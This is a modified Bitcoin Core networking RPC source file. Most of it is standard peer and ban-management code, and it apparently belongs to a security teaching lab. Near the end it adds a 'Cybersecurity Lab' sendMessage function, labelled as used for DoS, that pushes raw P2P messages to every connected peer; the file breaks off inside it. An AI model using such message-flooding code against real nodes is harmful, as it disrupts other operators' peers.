// Copyright (c) 2009-2019 The Bitcoin Core developers
// Distributed under the MIT software license, see the accompanying
// file COPYING or http://www.opensource.org/licenses/mit-license.php.

#include <rpc/server.h>

#include <banman.h>
#include <clientversion.h>
#include <core_io.h>
#include <net.h>
#include <net_permissions.h>
#include <net_processing.h>
#include <net_types.h> // For banmap_t
#include <netbase.h>
#include <node/context.h>
#include <policy/settings.h>
#include <rpc/blockchain.h>
#include <rpc/protocol.h>
#include <rpc/util.h>
#include <sync.h>
#include <timedata.h>
#include <util/strencodings.h>
#include <util/string.h>
#include <util/system.h>
#include <validation.h>
#include <version.h>
#include <warnings.h>
#include <blockencodings.h> // Cybersecurity Lab
#include <netmessagemaker.h> // Cybersecurity Lab
#include <merkleblock.h> // Cybersecurity Lab
#include <sstream> // Cybersecurity Lab
#include <vector> // Cybersecurity Lab
#include <ctime> // Cybersecurity Lab
#include <logging.cpp> // Cybersecurity Lab

#include <univalue.h>

static UniValue getconnectioncount(const JSONRPCRequest& request)
{
            RPCHelpMan{"getconnectioncount",
                "\nReturns the number of connections to other nodes.\n",
                {},
                RPCResult{
                    RPCResult::Type::NUM, "", "The connection count"
                },
                RPCExamples{
                    HelpExampleCli("getconnectioncount", "")
            + HelpExampleRpc("getconnectioncount", "")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    return (int)g_rpc_node->connman->GetNodeCount(CConnman::CONNECTIONS_ALL);
}

static UniValue ping(const JSONRPCRequest& request)
{
            RPCHelpMan{"ping",
                "\nRequests that a ping be sent to all other nodes, to measure ping time.\n"
                "Results provided in getpeerinfo, pingtime and pingwait fields are decimal seconds.\n"
                "Ping command is handled in queue with all other commands, so it measures processing backlog, not just network ping.\n",
                {},
                RPCResult{RPCResult::Type::NONE, "", ""},
                RPCExamples{
                    HelpExampleCli("ping", "")
            + HelpExampleRpc("ping", "")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    // Request that each node send a ping during next message processing pass
    g_rpc_node->connman->ForEachNode([](CNode* pnode) {
        pnode->fPingQueued = true;
    });
    return NullUniValue;
}

static UniValue getpeerinfo(const JSONRPCRequest& request)
{
            RPCHelpMan{"getpeerinfo",
                "\nReturns data about each connected network node as a json array of objects.\n",
                {},
                RPCResult{
                    RPCResult::Type::ARR, "", "",
                    {
                        {RPCResult::Type::OBJ, "", "",
                        {
                            {
                            {RPCResult::Type::NUM, "id", "Peer index"},
                            {RPCResult::Type::STR, "addr", "(host:port) The IP address and port of the peer"},
                            {RPCResult::Type::STR, "addrbind", "(ip:port) Bind address of the connection to the peer"},
                            {RPCResult::Type::STR, "addrlocal", "(ip:port) Local address as reported by the peer"},
                            {RPCResult::Type::NUM, "mapped_as", "The AS in the BGP route to the peer used for diversifying\n"
                                                                "peer selection (only available if the asmap config flag is set)"},
                            {RPCResult::Type::STR_HEX, "services", "The services offered"},
                            {RPCResult::Type::ARR, "servicesnames", "the services offered, in human-readable form",
                            {
                                {RPCResult::Type::STR, "SERVICE_NAME", "the service name if it is recognised"}
                            }},
                            {RPCResult::Type::BOOL, "relaytxes", "Whether peer has asked us to relay transactions to it"},
                            {RPCResult::Type::NUM_TIME, "lastsend", "The " + UNIX_EPOCH_TIME + " of the last send"},
                            {RPCResult::Type::NUM_TIME, "lastrecv", "The " + UNIX_EPOCH_TIME + " of the last receive"},
                            {RPCResult::Type::NUM, "bytessent", "The total bytes sent"},
                            {RPCResult::Type::NUM, "bytesrecv", "The total bytes received"},
                            {RPCResult::Type::NUM_TIME, "conntime", "The " + UNIX_EPOCH_TIME + " of the connection"},
                            {RPCResult::Type::NUM, "timeoffset", "The time offset in seconds"},
                            {RPCResult::Type::NUM, "pingtime", "ping time (if available)"},
                            {RPCResult::Type::NUM, "minping", "minimum observed ping time (if any at all)"},
                            {RPCResult::Type::NUM, "pingwait", "ping wait (if non-zero)"},
                            {RPCResult::Type::NUM, "version", "The peer version, such as 70001"},
                            {RPCResult::Type::STR, "subver", "The string version"},
                            {RPCResult::Type::BOOL, "inbound", "Inbound (true) or Outbound (false)"},
                            {RPCResult::Type::BOOL, "addnode", "Whether connection was due to addnode/-connect or if it was an automatic/inbound connection"},
                            {RPCResult::Type::NUM, "startingheight", "The starting height (block) of the peer"},
                            {RPCResult::Type::NUM, "banscore", "The ban score"},
                            {RPCResult::Type::NUM, "synced_headers", "The last header we have in common with this peer"},
                            {RPCResult::Type::NUM, "synced_blocks", "The last block we have in common with this peer"},
                            {RPCResult::Type::ARR, "inflight", "",
                            {
                                {RPCResult::Type::NUM, "n", "The heights of blocks we're currently asking from this peer"},
                            }},
                            {RPCResult::Type::BOOL, "whitelisted", "Whether the peer is whitelisted"},
                            {RPCResult::Type::NUM, "minfeefilter", "The minimum fee rate for transactions this peer accepts"},
                            {RPCResult::Type::OBJ_DYN, "bytessent_per_msg", "",
                            {
                                {RPCResult::Type::NUM, "msg", "The total bytes sent aggregated by message type\n"
                                                              "When a message type is not listed in this json object, the bytes sent are 0.\n"
                                                              "Only known message types can appear as keys in the object."}
                            }},
                            {RPCResult::Type::OBJ, "bytesrecv_per_msg", "",
                            {
                                {RPCResult::Type::NUM, "msg", "The total bytes received aggregated by message type\n"
                                                              "When a message type is not listed in this json object, the bytes received are 0.\n"
                                                              "Only known message types can appear as keys in the object and all bytes received of unknown message types are listed under '"+NET_MESSAGE_COMMAND_OTHER+"'."}
                            }},
                        }},
                    }},
                },
                RPCExamples{
                    HelpExampleCli("getpeerinfo", "")
            + HelpExampleRpc("getpeerinfo", "")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::vector<CNodeStats> vstats;
    g_rpc_node->connman->GetNodeStats(vstats);

    UniValue ret(UniValue::VARR);

    for (const CNodeStats& stats : vstats) {
        UniValue obj(UniValue::VOBJ);
        CNodeStateStats statestats;
        bool fStateStats = GetNodeStateStats(stats.nodeid, statestats);
        obj.pushKV("id", stats.nodeid);
        obj.pushKV("addr", stats.addrName);
        if (!(stats.addrLocal.empty()))
            obj.pushKV("addrlocal", stats.addrLocal);
        if (stats.addrBind.IsValid())
            obj.pushKV("addrbind", stats.addrBind.ToString());
        if (stats.m_mapped_as != 0) {
            obj.pushKV("mapped_as", uint64_t(stats.m_mapped_as));
        }
        obj.pushKV("services", strprintf("%016x", stats.nServices));
        obj.pushKV("servicesnames", GetServicesNames(stats.nServices));
        obj.pushKV("relaytxes", stats.fRelayTxes);
        obj.pushKV("lastsend", stats.nLastSend);
        obj.pushKV("lastrecv", stats.nLastRecv);
        obj.pushKV("bytessent", stats.nSendBytes);
        obj.pushKV("bytesrecv", stats.nRecvBytes);
        obj.pushKV("conntime", stats.nTimeConnected);
        obj.pushKV("timeoffset", stats.nTimeOffset);
        if (stats.m_ping_usec > 0) {
            obj.pushKV("pingtime", ((double)stats.m_ping_usec) / 1e6);
        }
        if (stats.m_min_ping_usec < std::numeric_limits<int64_t>::max()) {
            obj.pushKV("minping", ((double)stats.m_min_ping_usec) / 1e6);
        }
        if (stats.m_ping_wait_usec > 0) {
            obj.pushKV("pingwait", ((double)stats.m_ping_wait_usec) / 1e6);
        }
        obj.pushKV("version", stats.nVersion);
        // Use the sanitized form of subver here, to avoid tricksy remote peers from
        // corrupting or modifying the JSON output by putting special characters in
        // their ver message.
        obj.pushKV("subver", stats.cleanSubVer);
        obj.pushKV("inbound", stats.fInbound);
        obj.pushKV("addnode", stats.m_manual_connection);
        obj.pushKV("startingheight", stats.nStartingHeight);
        if (fStateStats) {
            obj.pushKV("banscore", statestats.nMisbehavior);
            obj.pushKV("synced_headers", statestats.nSyncHeight);
            obj.pushKV("synced_blocks", statestats.nCommonHeight);
            UniValue heights(UniValue::VARR);
            for (const int height : statestats.vHeightInFlight) {
                heights.push_back(height);
            }
            obj.pushKV("inflight", heights);
        }
        obj.pushKV("whitelisted", stats.m_legacyWhitelisted);
        UniValue permissions(UniValue::VARR);
        for (const auto& permission : NetPermissions::ToStrings(stats.m_permissionFlags)) {
            permissions.push_back(permission);
        }
        obj.pushKV("permissions", permissions);
        obj.pushKV("minfeefilter", ValueFromAmount(stats.minFeeFilter));

        UniValue sendPerMsgCmd(UniValue::VOBJ);
        for (const auto& i : stats.mapSendBytesPerMsgCmd) {
            if (i.second > 0)
                sendPerMsgCmd.pushKV(i.first, i.second);
        }
        obj.pushKV("bytessent_per_msg", sendPerMsgCmd);

        UniValue recvPerMsgCmd(UniValue::VOBJ);
        for (const auto& i : stats.mapRecvBytesPerMsgCmd) {
            if (i.second > 0)
                recvPerMsgCmd.pushKV(i.first, i.second);
        }
        obj.pushKV("bytesrecv_per_msg", recvPerMsgCmd);

        ret.push_back(obj);
    }

    return ret;
}

static UniValue addnode(const JSONRPCRequest& request)
{
    std::string strCommand;
    if (!request.params[1].isNull())
        strCommand = request.params[1].get_str();
    if (request.fHelp || request.params.size() != 2 ||
        (strCommand != "onetry" && strCommand != "add" && strCommand != "remove"))
        throw std::runtime_error(
            RPCHelpMan{"addnode",
                "\nAttempts to add or remove a node from the addnode list.\n"
                "Or try a connection to a node once.\n"
                "Nodes added using addnode (or -connect) are protected from DoS disconnection and are not required to be\n"
                "full nodes/support SegWit as other outbound peers are (though such peers will not be synced from).\n",
                {
                    {"node", RPCArg::Type::STR, RPCArg::Optional::NO, "The node (see getpeerinfo for nodes)"},
                    {"command", RPCArg::Type::STR, RPCArg::Optional::NO, "'add' to add a node to the list, 'remove' to remove a node from the list, 'onetry' to try a connection to the node once"},
                },
                RPCResult{RPCResult::Type::NONE, "", ""},
                RPCExamples{
                    HelpExampleCli("addnode", "\"192.168.0.6:8333\" \"onetry\"")
            + HelpExampleRpc("addnode", "\"192.168.0.6:8333\", \"onetry\"")
                },
            }.ToString());

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::string strNode = request.params[0].get_str();

    if (strCommand == "onetry")
    {
        CAddress addr;
        g_rpc_node->connman->OpenNetworkConnection(addr, false, nullptr, strNode.c_str(), false, false, true);
        return NullUniValue;
    }

    if (strCommand == "add")
    {
        if(!g_rpc_node->connman->AddNode(strNode))
            throw JSONRPCError(RPC_CLIENT_NODE_ALREADY_ADDED, "Error: Node already added");
    }
    else if(strCommand == "remove")
    {
        if(!g_rpc_node->connman->RemoveAddedNode(strNode))
            throw JSONRPCError(RPC_CLIENT_NODE_NOT_ADDED, "Error: Node has not been added.");
    }

    return NullUniValue;
}

static UniValue disconnectnode(const JSONRPCRequest& request)
{
            RPCHelpMan{"disconnectnode",
                "\nImmediately disconnects from the specified peer node.\n"
                "\nStrictly one out of 'address' and 'nodeid' can be provided to identify the node.\n"
                "\nTo disconnect by nodeid, either set 'address' to the empty string, or call using the named 'nodeid' argument only.\n",
                {
                    {"address", RPCArg::Type::STR, /* default */ "fallback to nodeid", "The IP address/port of the node"},
                    {"nodeid", RPCArg::Type::NUM, /* default */ "fallback to address", "The node ID (see getpeerinfo for node IDs)"},
                },
                RPCResult{RPCResult::Type::NONE, "", ""},
                RPCExamples{
                    HelpExampleCli("disconnectnode", "\"192.168.0.6:8333\"")
            + HelpExampleCli("disconnectnode", "\"\" 1")
            + HelpExampleRpc("disconnectnode", "\"192.168.0.6:8333\"")
            + HelpExampleRpc("disconnectnode", "\"\", 1")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    bool success;
    const UniValue &address_arg = request.params[0];
    const UniValue &id_arg = request.params[1];

    if (!address_arg.isNull() && id_arg.isNull()) {
        /* handle disconnect-by-address */
        success = g_rpc_node->connman->DisconnectNode(address_arg.get_str());
    } else if (!id_arg.isNull() && (address_arg.isNull() || (address_arg.isStr() && address_arg.get_str().empty()))) {
        /* handle disconnect-by-id */
        NodeId nodeid = (NodeId) id_arg.get_int64();
        success = g_rpc_node->connman->DisconnectNode(nodeid);
    } else {
        throw JSONRPCError(RPC_INVALID_PARAMS, "Only one of address and nodeid should be provided.");
    }

    if (!success) {
        throw JSONRPCError(RPC_CLIENT_NODE_NOT_CONNECTED, "Node not found in connected nodes");
    }

    return NullUniValue;
}

static UniValue getaddednodeinfo(const JSONRPCRequest& request)
{
            RPCHelpMan{"getaddednodeinfo",
                "\nReturns information about the given added node, or all added nodes\n"
                "(note that onetry addnodes are not listed here)\n",
                {
                    {"node", RPCArg::Type::STR, /* default */ "all nodes", "If provided, return information about this specific node, otherwise all nodes are returned."},
                },
                RPCResult{
                    RPCResult::Type::ARR, "", "",
                    {
                        {RPCResult::Type::OBJ, "", "",
                        {
                            {RPCResult::Type::STR, "addednode", "The node IP address or name (as provided to addnode)"},
                            {RPCResult::Type::BOOL, "connected", "If connected"},
                            {RPCResult::Type::ARR, "addresses", "Only when connected = true",
                            {
                                {RPCResult::Type::OBJ, "", "",
                                {
                                    {RPCResult::Type::STR, "address", "The bitcoin server IP and port we're connected to"},
                                    {RPCResult::Type::STR, "connected", "connection, inbound or outbound"},
                                }},
                            }},
                        }},
                    }
                },
                RPCExamples{
                    HelpExampleCli("getaddednodeinfo", "\"192.168.0.201\"")
            + HelpExampleRpc("getaddednodeinfo", "\"192.168.0.201\"")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::vector<AddedNodeInfo> vInfo = g_rpc_node->connman->GetAddedNodeInfo();

    if (!request.params[0].isNull()) {
        bool found = false;
        for (const AddedNodeInfo& info : vInfo) {
            if (info.strAddedNode == request.params[0].get_str()) {
                vInfo.assign(1, info);
                found = true;
                break;
            }
        }
        if (!found) {
            throw JSONRPCError(RPC_CLIENT_NODE_NOT_ADDED, "Error: Node has not been added.");
        }
    }

    UniValue ret(UniValue::VARR);

    for (const AddedNodeInfo& info : vInfo) {
        UniValue obj(UniValue::VOBJ);
        obj.pushKV("addednode", info.strAddedNode);
        obj.pushKV("connected", info.fConnected);
        UniValue addresses(UniValue::VARR);
        if (info.fConnected) {
            UniValue address(UniValue::VOBJ);
            address.pushKV("address", info.resolvedAddress.ToString());
            address.pushKV("connected", info.fInbound ? "inbound" : "outbound");
            addresses.push_back(address);
        }
        obj.pushKV("addresses", addresses);
        ret.push_back(obj);
    }

    return ret;
}

static UniValue getnettotals(const JSONRPCRequest& request)
{
            RPCHelpMan{"getnettotals",
                "\nReturns information about network traffic, including bytes in, bytes out,\n"
                "and current time.\n",
                {},
                RPCResult{
                   RPCResult::Type::OBJ, "", "",
                   {
                       {RPCResult::Type::NUM, "totalbytesrecv", "Total bytes received"},
                       {RPCResult::Type::NUM, "totalbytessent", "Total bytes sent"},
                       {RPCResult::Type::NUM_TIME, "timemillis", "Current UNIX time in milliseconds"},
                       {RPCResult::Type::OBJ, "uploadtarget", "",
                       {
                           {RPCResult::Type::NUM, "timeframe", "Length of the measuring timeframe in seconds"},
                           {RPCResult::Type::NUM, "target", "Target in bytes"},
                           {RPCResult::Type::BOOL, "target_reached", "True if target is reached"},
                           {RPCResult::Type::BOOL, "serve_historical_blocks", "True if serving historical blocks"},
                           {RPCResult::Type::NUM, "bytes_left_in_cycle", "Bytes left in current time cycle"},
                           {RPCResult::Type::NUM, "time_left_in_cycle", "Seconds left in current time cycle"},
                        }},
                    }
                },
                RPCExamples{
                    HelpExampleCli("getnettotals", "")
            + HelpExampleRpc("getnettotals", "")
                },
            }.Check(request);
    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    UniValue obj(UniValue::VOBJ);
    obj.pushKV("totalbytesrecv", g_rpc_node->connman->GetTotalBytesRecv());
    obj.pushKV("totalbytessent", g_rpc_node->connman->GetTotalBytesSent());
    obj.pushKV("timemillis", GetTimeMillis());

    UniValue outboundLimit(UniValue::VOBJ);
    outboundLimit.pushKV("timeframe", g_rpc_node->connman->GetMaxOutboundTimeframe());
    outboundLimit.pushKV("target", g_rpc_node->connman->GetMaxOutboundTarget());
    outboundLimit.pushKV("target_reached", g_rpc_node->connman->OutboundTargetReached(false));
    outboundLimit.pushKV("serve_historical_blocks", !g_rpc_node->connman->OutboundTargetReached(true));
    outboundLimit.pushKV("bytes_left_in_cycle", g_rpc_node->connman->GetOutboundTargetBytesLeft());
    outboundLimit.pushKV("time_left_in_cycle", g_rpc_node->connman->GetMaxOutboundTimeLeftInCycle());
    obj.pushKV("uploadtarget", outboundLimit);
    return obj;
}

static UniValue GetNetworksInfo()
{
    UniValue networks(UniValue::VARR);
    for(int n=0; n<NET_MAX; ++n)
    {
        enum Network network = static_cast<enum Network>(n);
        if(network == NET_UNROUTABLE || network == NET_INTERNAL)
            continue;
        proxyType proxy;
        UniValue obj(UniValue::VOBJ);
        GetProxy(network, proxy);
        obj.pushKV("name", GetNetworkName(network));
        obj.pushKV("limited", !IsReachable(network));
        obj.pushKV("reachable", IsReachable(network));
        obj.pushKV("proxy", proxy.IsValid() ? proxy.proxy.ToStringIPPort() : std::string());
        obj.pushKV("proxy_randomize_credentials", proxy.randomize_credentials);
        networks.push_back(obj);
    }
    return networks;
}

static UniValue getnetworkinfo(const JSONRPCRequest& request)
{
            RPCHelpMan{"getnetworkinfo",
                "Returns an object containing various state info regarding P2P networking.\n",
                {},
                RPCResult{
                    RPCResult::Type::OBJ, "", "",
                    {
                        {RPCResult::Type::NUM, "version", "the server version"},
                        {RPCResult::Type::STR, "subversion", "the server subversion string"},
                        {RPCResult::Type::NUM, "protocolversion", "the protocol version"},
                        {RPCResult::Type::STR_HEX, "localservices", "the services we offer to the network"},
                        {RPCResult::Type::ARR, "localservicesnames", "the services we offer to the network, in human-readable form",
                        {
                            {RPCResult::Type::STR, "SERVICE_NAME", "the service name"},
                        }},
                        {RPCResult::Type::BOOL, "localrelay", "true if transaction relay is requested from peers"},
                        {RPCResult::Type::NUM, "timeoffset", "the time offset"},
                        {RPCResult::Type::NUM, "connections", "the number of connections"},
                        {RPCResult::Type::BOOL, "networkactive", "whether p2p networking is enabled"},
                        {RPCResult::Type::ARR, "networks", "information per network",
                        {
                            {RPCResult::Type::OBJ, "", "",
                            {
                                {RPCResult::Type::STR, "name", "network (ipv4, ipv6 or onion)"},
                                {RPCResult::Type::BOOL, "limited", "is the network limited using -onlynet?"},
                                {RPCResult::Type::BOOL, "reachable", "is the network reachable?"},
                                {RPCResult::Type::STR, "proxy", "(\"host:port\") the proxy that is used for this network, or empty if none"},
                                {RPCResult::Type::BOOL, "proxy_randomize_credentials", "Whether randomized credentials are used"},
                            }},
                        }},
                        {RPCResult::Type::NUM, "relayfee", "minimum relay fee for transactions in " + CURRENCY_UNIT + "/kB"},
                        {RPCResult::Type::NUM, "incrementalfee", "minimum fee increment for mempool limiting or BIP 125 replacement in " + CURRENCY_UNIT + "/kB"},
                        {RPCResult::Type::ARR, "localaddresses", "list of local addresses",
                        {
                            {RPCResult::Type::OBJ, "", "",
                            {
                                {RPCResult::Type::STR, "address", "network address"},
                                {RPCResult::Type::NUM, "port", "network port"},
                                {RPCResult::Type::NUM, "score", "relative score"},
                            }},
                        }},
                        {RPCResult::Type::STR, "warnings", "any network and blockchain warnings"},
                    }
                },
                RPCExamples{
                    HelpExampleCli("getnetworkinfo", "")
            + HelpExampleRpc("getnetworkinfo", "")
                },
            }.Check(request);

    LOCK(cs_main);
    UniValue obj(UniValue::VOBJ);
    obj.pushKV("version",       CLIENT_VERSION);
    obj.pushKV("subversion",    strSubVersion);
    obj.pushKV("protocolversion",PROTOCOL_VERSION);
    if (g_rpc_node->connman) {
        ServiceFlags services = g_rpc_node->connman->GetLocalServices();
        obj.pushKV("localservices", strprintf("%016x", services));
        obj.pushKV("localservicesnames", GetServicesNames(services));
    }
    obj.pushKV("localrelay", g_relay_txes);
    obj.pushKV("timeoffset",    GetTimeOffset());
    if (g_rpc_node->connman) {
        obj.pushKV("networkactive", g_rpc_node->connman->GetNetworkActive());
        obj.pushKV("connections",   (int)g_rpc_node->connman->GetNodeCount(CConnman::CONNECTIONS_ALL));
    }
    obj.pushKV("networks",      GetNetworksInfo());
    obj.pushKV("relayfee",      ValueFromAmount(::minRelayTxFee.GetFeePerK()));
    obj.pushKV("incrementalfee", ValueFromAmount(::incrementalRelayFee.GetFeePerK()));
    UniValue localAddresses(UniValue::VARR);
    {
        LOCK(cs_mapLocalHost);
        for (const std::pair<const CNetAddr, LocalServiceInfo> &item : mapLocalHost)
        {
            UniValue rec(UniValue::VOBJ);
            rec.pushKV("address", item.first.ToString());
            rec.pushKV("port", item.second.nPort);
            rec.pushKV("score", item.second.nScore);
            localAddresses.push_back(rec);
        }
    }
    obj.pushKV("localaddresses", localAddresses);
    obj.pushKV("warnings",       GetWarnings(false));
    return obj;
}

static UniValue setban(const JSONRPCRequest& request)
{
    const RPCHelpMan help{"setban",
                "\nAttempts to add or remove an IP/Subnet from the banned list.\n",
                {
                    {"subnet", RPCArg::Type::STR, RPCArg::Optional::NO, "The IP/Subnet (see getpeerinfo for nodes IP) with an optional netmask (default is /32 = single IP)"},
                    {"command", RPCArg::Type::STR, RPCArg::Optional::NO, "'add' to add an IP/Subnet to the list, 'remove' to remove an IP/Subnet from the list"},
                    {"bantime", RPCArg::Type::NUM, /* default */ "0", "time in seconds how long (or until when if [absolute] is set) the IP is banned (0 or empty means using the default time of 24h which can also be overwritten by the -bantime startup argument)"},
                    {"absolute", RPCArg::Type::BOOL, /* default */ "false", "If set, the bantime must be an absolute timestamp expressed in " + UNIX_EPOCH_TIME},
                },
                RPCResult{RPCResult::Type::NONE, "", ""},
                RPCExamples{
                    HelpExampleCli("setban", "\"192.168.0.6\" \"add\" 86400")
                            + HelpExampleCli("setban", "\"192.168.0.0/24\" \"add\"")
                            + HelpExampleRpc("setban", "\"192.168.0.6\", \"add\", 86400")
                },
    };
    std::string strCommand;
    if (!request.params[1].isNull())
        strCommand = request.params[1].get_str();
    if (request.fHelp || !help.IsValidNumArgs(request.params.size()) || (strCommand != "add" && strCommand != "remove")) {
        throw std::runtime_error(help.ToString());
    }
    if (!g_rpc_node->banman) {
        throw JSONRPCError(RPC_DATABASE_ERROR, "Error: Ban database not loaded");
    }

    CSubNet subNet;
    CNetAddr netAddr;
    bool isSubnet = false;

    if (request.params[0].get_str().find('/') != std::string::npos)
        isSubnet = true;

    if (!isSubnet) {
        CNetAddr resolved;
        LookupHost(request.params[0].get_str(), resolved, false);
        netAddr = resolved;
    }
    else
        LookupSubNet(request.params[0].get_str(), subNet);

    if (! (isSubnet ? subNet.IsValid() : netAddr.IsValid()) )
        throw JSONRPCError(RPC_CLIENT_INVALID_IP_OR_SUBNET, "Error: Invalid IP/Subnet");

    if (strCommand == "add")
    {
        if (isSubnet ? g_rpc_node->banman->IsBanned(subNet) : g_rpc_node->banman->IsBanned(netAddr)) {
            throw JSONRPCError(RPC_CLIENT_NODE_ALREADY_ADDED, "Error: IP/Subnet already banned");
        }

        int64_t banTime = 0; //use standard bantime if not specified
        if (!request.params[2].isNull())
            banTime = request.params[2].get_int64();

        bool absolute = false;
        if (request.params[3].isTrue())
            absolute = true;

        if (isSubnet) {
            g_rpc_node->banman->Ban(subNet, BanReasonManuallyAdded, banTime, absolute);
            if (g_rpc_node->connman) {
                g_rpc_node->connman->DisconnectNode(subNet);
            }
        } else {
            g_rpc_node->banman->Ban(netAddr, BanReasonManuallyAdded, banTime, absolute);
            if (g_rpc_node->connman) {
                g_rpc_node->connman->DisconnectNode(netAddr);
            }
        }
    }
    else if(strCommand == "remove")
    {
        if (!( isSubnet ? g_rpc_node->banman->Unban(subNet) : g_rpc_node->banman->Unban(netAddr) )) {
            throw JSONRPCError(RPC_CLIENT_INVALID_IP_OR_SUBNET, "Error: Unban failed. Requested address/subnet was not previously banned.");
        }
    }
    return NullUniValue;
}

static UniValue listbanned(const JSONRPCRequest& request)
{
            RPCHelpMan{"listbanned",
                "\nList all banned IPs/Subnets.\n",
                {},
        RPCResult{RPCResult::Type::ARR, "", "",
            {
                {RPCResult::Type::OBJ, "", "",
                    {
                        {RPCResult::Type::STR, "address", ""},
                        {RPCResult::Type::NUM_TIME, "banned_until", ""},
                        {RPCResult::Type::NUM_TIME, "ban_created", ""},
                        {RPCResult::Type::STR, "ban_reason", ""},
                    }},
            }},
                RPCExamples{
                    HelpExampleCli("listbanned", "")
                            + HelpExampleRpc("listbanned", "")
                },
            }.Check(request);

    if(!g_rpc_node->banman) {
        throw JSONRPCError(RPC_DATABASE_ERROR, "Error: Ban database not loaded");
    }

    banmap_t banMap;
    g_rpc_node->banman->GetBanned(banMap);

    UniValue bannedAddresses(UniValue::VARR);
    for (const auto& entry : banMap)
    {
        const CBanEntry& banEntry = entry.second;
        UniValue rec(UniValue::VOBJ);
        rec.pushKV("address", entry.first.ToString());
        rec.pushKV("banned_until", banEntry.nBanUntil);
        rec.pushKV("ban_created", banEntry.nCreateTime);
        rec.pushKV("ban_reason", banEntry.banReasonToString());

        bannedAddresses.push_back(rec);
    }

    return bannedAddresses;
}

static UniValue clearbanned(const JSONRPCRequest& request)
{
            RPCHelpMan{"clearbanned",
                "\nClear all banned IPs.\n",
                {},
                RPCResult{RPCResult::Type::NONE, "", ""},
                RPCExamples{
                    HelpExampleCli("clearbanned", "")
                            + HelpExampleRpc("clearbanned", "")
                },
            }.Check(request);
    if (!g_rpc_node->banman) {
        throw JSONRPCError(RPC_DATABASE_ERROR, "Error: Ban database not loaded");
    }

    g_rpc_node->banman->ClearBanned();

    return NullUniValue;
}

static UniValue setnetworkactive(const JSONRPCRequest& request)
{
            RPCHelpMan{"setnetworkactive",
                "\nDisable/enable all p2p network activity.\n",
                {
                    {"state", RPCArg::Type::BOOL, RPCArg::Optional::NO, "true to enable networking, false to disable"},
                },
                RPCResult{RPCResult::Type::BOOL, "", "The value that was passed in"},
                RPCExamples{""},
            }.Check(request);

    if (!g_rpc_node->connman) {
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");
    }

    g_rpc_node->connman->SetNetworkActive(request.params[0].get_bool());

    return g_rpc_node->connman->GetNetworkActive();
}

static UniValue getnodeaddresses(const JSONRPCRequest& request)
{
            RPCHelpMan{"getnodeaddresses",
                "\nReturn known addresses which can potentially be used to find new nodes in the network\n",
                {
                    {"count", RPCArg::Type::NUM, /* default */ "1", "How many addresses to return. Limited to the smaller of " + ToString(ADDRMAN_GETADDR_MAX) + " or " + ToString(ADDRMAN_GETADDR_MAX_PCT) + "% of all known addresses."},
                },
                RPCResult{
                    RPCResult::Type::ARR, "", "",
                    {
                        {RPCResult::Type::OBJ, "", "",
                        {
                            {RPCResult::Type::NUM_TIME, "time", "The " + UNIX_EPOCH_TIME + " of when the node was last seen"},
                            {RPCResult::Type::NUM, "services", "The services offered"},
                            {RPCResult::Type::STR, "address", "The address of the node"},
                            {RPCResult::Type::NUM, "port", "The port of the node"},
                        }},
                    }
                },
                RPCExamples{
                    HelpExampleCli("getnodeaddresses", "8")
            + HelpExampleRpc("getnodeaddresses", "8")
                },
            }.Check(request);
    if (!g_rpc_node->connman) {
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");
    }

    int count = 1;
    if (!request.params[0].isNull()) {
        count = request.params[0].get_int();
        if (count <= 0) {
            throw JSONRPCError(RPC_INVALID_PARAMETER, "Address count out of range");
        }
    }
    // returns a shuffled list of CAddress
    std::vector<CAddress> vAddr = g_rpc_node->connman->GetAddresses();
    UniValue ret(UniValue::VARR);

    int address_return_count = std::min<int>(count, vAddr.size());
    for (int i = 0; i < address_return_count; ++i) {
        UniValue obj(UniValue::VOBJ);
        const CAddress& addr = vAddr[i];
        obj.pushKV("time", (int)addr.nTime);
        obj.pushKV("services", (uint64_t)addr.nServices);
        obj.pushKV("address", addr.ToStringIP());
        obj.pushKV("port", addr.GetPort());
        ret.push_back(obj);
    }
    return ret;
}


// Cybersecurity Lab
// Used by DoS and send
static UniValue sendMessage(std::string msg, std::string rawArgs, bool printResult)
{
    std::vector<std::string> args;
    std::stringstream ss(rawArgs);
    std::string item;
    while (getline(ss, item, ',')) {
        args.push_back(item);
    }

    // Timer start
    clock_t begin = clock();

    CSerializedNetMsg netMsg;

    std::string outputMessage = "";
    g_rpc_node->connman->ForEachNode([&msg, &args, &netMsg, &outputMessage](CNode* pnode) {
        LOCK(pnode->cs_inventory);

        if (msg == "filterload") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FILTERLOAD);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FILTERLOAD));

        } else if(msg == "filteradd") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FILTERADD);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FILTERADD));

        } else if(msg == "filterclear") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FILTERCLEAR);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FILTERCLEAR));

        } else if(msg == "version") {
          ServiceFlags nLocalNodeServices = pnode->GetLocalServices();
          int64_t nTime = GetTime();
          //uint64_t nonce = pnode->GetLocalNonce();
          uint64_t nonce = 0;
          while (nonce == 0) {
